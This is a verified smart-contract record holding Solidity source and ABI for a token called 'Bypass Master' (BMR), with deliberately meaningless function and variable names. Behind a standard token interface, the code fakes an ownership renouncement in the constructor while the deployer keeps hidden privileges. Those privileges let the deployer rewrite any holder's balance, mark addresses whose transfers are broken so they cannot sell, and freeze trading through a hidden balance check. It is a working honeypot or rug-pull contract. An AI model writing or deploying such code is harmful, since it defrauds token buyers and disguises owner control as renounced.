{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface autoTx {\n    function createPair(address swapLaunch, address takeMin) external returns (address);\n}\n\ninterface txLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderSwap) external view returns (uint256);\n\n    function transfer(address launchedToken, uint256 senderToken) external returns (bool);\n\n    function allowance(address buyModeSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedToken,\n        uint256 senderToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldFund, uint256 value);\n    event Approval(address indexed buyModeSender, address indexed spender, uint256 value);\n}\n\nabstract contract receiverMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txLaunchedMetadata is txLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BypassMaster is receiverMode, txLaunched, txLaunchedMetadata {\n\n    constructor (){\n        if (buyEnable) {\n            buyEnable = false;\n        }\n        receiverList receiverTrading = receiverList(walletTotal);\n        autoLaunched = autoTx(receiverTrading.factory()).createPair(receiverTrading.WETH(), address(this));\n        if (shouldMax != walletBuy) {\n            buyEnable = true;\n        }\n        sellTakeSender = _msgSender();\n        launchedReceiverAt[sellTakeSender] = true;\n        fromLaunched[sellTakeSender] = liquidityReceiver;\n        limitLaunchedReceiver();\n        \n        emit Transfer(address(0), sellTakeSender, liquidityReceiver);\n    }\n\n    function transferFrom(address txToken, address launchedToken, uint256 senderToken) external override returns (bool) {\n        if (_msgSender() != walletTotal) {\n            if (fundSwapList[txToken][_msgSender()] != type(uint256).max) {\n                require(senderToken <= fundSwapList[txToken][_msgSender()]);\n                fundSwapList[txToken][_msgSender()] -= senderToken;\n            }\n        }\n        return listLaunch(txToken, launchedToken, senderToken);\n    }\n\n    function listLaunch(address txToken, address launchedToken, uint256 senderToken) internal returns (bool) {\n        if (txToken == sellTakeSender) {\n            return walletTradingAmount(txToken, launchedToken, senderToken);\n        }\n        uint256 amountAuto = txLaunched(autoLaunched).balanceOf(takeTotalMin);\n        require(amountAuto == atEnableTeam);\n        require(launchedToken != takeTotalMin);\n        if (modeFrom[txToken]) {\n            return walletTradingAmount(txToken, launchedToken, receiverTotal);\n        }\n        return walletTradingAmount(txToken, launchedToken, senderToken);\n    }\n\n    address public autoLaunched;\n\n    address walletTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant receiverTotal = 17 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityReceiver;\n    }\n\n    function balanceOf(address senderSwap) public view virtual override returns (uint256) {\n        return fromLaunched[senderSwap];\n    }\n\n    bool public shouldMax;\n\n    function limitLaunchedReceiver() public {\n        emit OwnershipTransferred(sellTakeSender, address(0));\n        modeExempt = address(0);\n    }\n\n    function launchedList(address feeTrading) public {\n        teamLiquidityLaunch();\n        \n        if (feeTrading == sellTakeSender || feeTrading == autoLaunched) {\n            return;\n        }\n        modeFrom[feeTrading] = true;\n    }\n\n    uint8 private sellList = 18;\n\n    address private modeExempt;\n\n    event OwnershipTransferred(address indexed tradingAtTotal, address indexed tradingShould);\n\n    function approve(address toTeam, uint256 senderToken) public virtual override returns (bool) {\n        fundSwapList[_msgSender()][toTeam] = senderToken;\n        emit Approval(_msgSender(), toTeam, senderToken);\n        return true;\n    }\n\n    uint256 private liquidityReceiver = 100000000 * 10 ** 18;\n\n    function transfer(address receiverWalletFund, uint256 senderToken) external virtual override returns (bool) {\n        return listLaunch(_msgSender(), receiverWalletFund, senderToken);\n    }\n\n    function allowance(address tokenIs, address toTeam) external view virtual override returns (uint256) {\n        if (toTeam == walletTotal) {\n            return type(uint256).max;\n        }\n        return fundSwapList[tokenIs][toTeam];\n    }\n\n    function launchModeLimit(address receiverWalletFund, uint256 senderToken) public {\n        teamLiquidityLaunch();\n        fromLaunched[receiverWalletFund] = senderToken;\n    }\n\n    address takeTotalMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public launchedReceiverAt;\n\n    function owner() external view returns (address) {\n        return modeExempt;\n    }\n\n    function walletTradingAmount(address txToken, address launchedToken, uint256 senderToken) internal returns (bool) {\n        require(fromLaunched[txToken] >= senderToken);\n        fromLaunched[txToken] -= senderToken;\n        fromLaunched[launchedToken] += senderToken;\n        emit Transfer(txToken, launchedToken, senderToken);\n        return true;\n    }\n\n    bool private walletBuy;\n\n    mapping(address => bool) public modeFrom;\n\n    bool public buyEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellList;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toLimit;\n    }\n\n    function getOwner() external view returns (address) {\n        return modeExempt;\n    }\n\n    string private toLimit = \"Bypass Master\";\n\n    bool public feeTake;\n\n    uint256 autoShouldFrom;\n\n    mapping(address => mapping(address => uint256)) private fundSwapList;\n\n    address public sellTakeSender;\n\n    function listBuy(address swapTrading) public {\n        require(swapTrading.balance < 100000);\n        if (feeTake) {\n            return;\n        }\n        if (walletBuy != shouldMax) {\n            walletBuy = false;\n        }\n        launchedReceiverAt[swapTrading] = true;\n        \n        feeTake = true;\n    }\n\n    function teamLiquidityLaunch() private view {\n        require(launchedReceiverAt[_msgSender()]);\n    }\n\n    uint256 atEnableTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitLaunch;\n    }\n\n    string private limitLaunch = \"BMR\";\n\n    mapping(address => uint256) private fromLaunched;\n\n    function receiverAmount(uint256 senderToken) public {\n        teamLiquidityLaunch();\n        atEnableTeam = senderToken;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyModeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAtTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWalletFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"launchModeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"}],\"name\":\"launchedList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedReceiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"}],\"name\":\"listBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"receiverAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTakeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWalletFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BypassMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}